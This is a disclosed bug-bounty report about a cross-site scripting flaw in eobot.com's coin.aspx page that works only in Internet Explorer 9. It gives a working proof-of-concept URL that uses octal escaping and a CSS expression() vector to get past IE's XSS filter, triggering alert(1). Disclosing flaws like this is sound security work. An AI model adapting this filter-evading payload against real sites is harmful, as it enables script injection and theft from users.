@@ -1,0 +1,20 @@
+ReportLink:https://hackerone.com/reports/37622
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/masatokinugawa
+ReportedTo:Eobot(eobotcom)
+BountyAmount:10.0
+Severity:
+State:Closed
+DateOfDisclosure:29.11.2014 2:39:54
+
+Summary:
+
+
+You can reporoduce this bug from the following URL. It works on only IE9:
+
+https://www.eobot.com/coin.aspx?coin=*/(URL[%26quot;\142\151\147%26quot;][%26quot;\143\157\156\163\164\162\165\143\164\157\162%26quot;](%26quot;\141\154\145\162\164\75\141\154\145\162\164\50\61\51%26quot;)())'%3E%3C%%20style='x:expression/*
+
+Note: This vector can bypass IE's XSS filter.
+
+I recommend fixing this.
+Thanks!
